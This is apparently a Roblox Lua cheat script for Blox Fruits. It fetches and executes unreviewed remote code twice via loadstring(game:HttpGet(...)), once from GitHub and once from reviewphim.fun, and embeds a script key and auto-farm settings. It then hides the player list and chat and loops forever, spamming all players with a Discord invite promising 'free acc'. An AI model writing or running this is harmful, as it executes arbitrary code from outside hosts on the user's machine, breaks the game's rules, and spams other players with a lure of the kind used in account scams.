_G.whiteScreen = false
_G.fps = 120
_G.Mode = true
loadstring(game:HttpGet('https://raw.githubusercontent.com/AloneBiNgu/AloneHub/main/lag'))()

-- Max level, godhuman, cdk, sgt
script_key = "U6GJTMMIV6XLH2FX433O77X2ZLU7D57J7XF35KNXXI"
getgenv().Shutdown = false -- Turn on if u are farming bulk accounts
getgenv().Configs = {
    ["Team"] = "Marines",
    ["Gun Farm"] = false, -- Disabled
    ["FPS Boost"] = {
        ["Enable"] = true,
        ["FPS Cap"] = 30,
    },
    ["Farm Boss Drops"] = {
        ["Enable"] = false,
        ["When x2 Exp Expired"] = false
    },
    ["Rainbow Haki"] = false,
    ["Hop Player Near"] = false,
    ["Skull Guitar"] = false,
    ["Find Fruit"] = false, -- Will find 1m+ fruit to unlock swan door to access third sea
    ["Cursed Dual Katana"] = false,
    ["Switch Melee"] = true,
    ["Eat Fruit"] = "", -- leave blank for none, put the fruit name like this example: Smoke Fruit, T-Rex Fruit, ...
    ["Snipe Fruit"] = "", -- leave blank for none, put the fruit name like this example: Smoke Fruit, T-Rex Fruit, ...
    ["Lock Fragment"] = 0,
    ["Buy Stuffs"] = true -- buso, geppo, soru, ken haki
}
repeat task.wait() pcall(function() loadstring(game:HttpGet("https://reviewphim.fun/Xero%20Hub/Blox%20Fruit/kaitun.lua"))() end) until getgenv().Check_Execute

local CoreGui = game:GetService("StarterGui")
CoreGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
CoreGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)

local mensagem = "Auto farm and free acc?
Check this out: dc/YsR6ymwND4"
local tempo = 100

local function enviarMensagem()
    local chatEvent = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
    if chatEvent then
        chatEvent:FireServer(mensagem, "All")
        print("Mensagem enviada: " .. mensagem)
    else
        warn("Evento de chat não encontrado.")
    end
end

while true do
    enviarMensagem()
    wait(tempo)
end
